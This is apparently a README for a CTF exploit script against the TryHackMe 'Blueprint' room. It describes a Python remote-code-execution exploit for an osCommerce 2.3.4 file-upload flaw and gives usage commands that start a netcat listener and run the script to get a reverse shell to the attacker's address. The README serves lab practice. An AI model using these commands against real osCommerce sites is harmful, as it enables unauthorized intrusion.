## About:
* **Platform**&nbsp;&nbsp;&nbsp;: TryHackMe
* **Challenge**&nbsp;: Blueprint
* **Difficulty**&nbsp;&nbsp;: Easy
* **Link**&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;: [https://tryhackme.com/room/blueprint](https://tryhackme.com/room/blueprint)

## Description:
This script exploits a **File Upload** vulnerability in **osCommerce version 2.3.4**, which can lead to **Remote Code Execution** allowing the adversary to execute OS commands remotely.<br/>

## Reference:
[+] [https://www.exploit-db.com/exploits/44374](https://www.exploit-db.com/exploits/44374)

## Usage:
```bash
# Start a netcat listener on port 'LPORT':
$ nc -nlvp LPORT
# Run the script: 
$ python3 osCommerce-rce.py RHOST RPORT TARGETURI LHOST LPORT
```

## Example:
```bash
$ nc -nlvp 8888
$ python3 osCommerce-rce.py blueprint.thm 8080 /oscommerce-2.3.4/ 10.8.16.233 8888
```
![2023-09-29 00_26_51-KaliLinux - VMware Workstation 17 Player (Non-commercial use only)](https://github.com/YounesTasra-R4z3rSw0rd/CTF-Scripts/assets/101610095/e0989126-b2a7-4c33-83a6-d2ca03ef9d1f)
